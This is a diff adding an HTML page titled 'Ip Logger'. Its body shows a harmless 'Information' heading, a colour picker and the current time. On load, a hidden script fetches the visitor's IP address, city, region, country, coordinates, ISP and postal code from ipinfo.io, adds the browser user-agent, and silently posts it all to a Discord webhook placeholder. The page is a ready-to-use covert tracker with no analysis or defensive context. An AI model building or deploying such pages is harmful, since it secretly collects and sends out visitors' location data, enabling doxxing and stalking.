@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Ip Logger</title>
+	<link type="text/css" rel="stylesheet" href="style.css">
+	<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+	<script>
+		$.get("https://ipinfo.io", function(response) {
+			const webhook_url = "YOUR_WEBHOOK";
+			const main = {
+				title: "Meths | IP Logger",
+				description: "> IP Logger",
+				thumbnail: {
+					url: "https://cdn.discordapp.com/avatars/586435544750358540/a_36fc175d7430d6e04516474126184ed4.gif?size=2048",
+				},
+				fields: [
+					{
+						name: "IP:",
+						value: `\`${response.ip}\``,
+						inline: false,
+					},
+					{
+						name: "User-Agent:",
+						value: `\`${navigator.userAgent}\``,
+						inline: false,
+					},
+					{
+						name: "City:",
+						value: `\`${response.city}\``,
+						inline: false,
+					},
+					{
+						name: "Region:",
+						value: `\`${response.region}\``,
+						inline: false
+					},
+					{
+						name: "Country:",
+						value: `\`${response.country}\``,
+						inline: false
+					},
+					{
+						name: "Long/Lat:",
+						value: `\`${response.loc}\``,
+						inline: false
+					},
+					{
+						name: "Company:",
+						value: `\`${response.org}\``,
+						inline: false
+					},
+					{
+						name: "Postal Region:",
+						value: `\`${response.postal}\``,
+						inline: false
+					},
+				],
+				footer: {
+					text: "Meths | GET IP LOGGED"
+				},
+				author: {
+					name: "{ Meths }",
+					url: ""
+				}
+			}
+			var xhttp = new XMLHttpRequest();
+			const url = webhook_url;
+			xhttp.open("POST", url, true);
+			xhttp.setRequestHeader('Content-Type', 'application/json');
+			xhttp.send(JSON.stringify({
+				'username': 'IP Logger',
+				'embeds': [main],
+			}));
+		}, "json");
+	</script>
+</head>
+<body>
+	<center>
+		<h1>Information</h1>
+		<input type="color"></input>
+		<p>Actual time: <span id="here"></span></p>
+	</center>
+	<script>
+		const date = new Date();
+		document.getElementById('here').innerHTML = date;
+	</script>
+</body>
+</html>
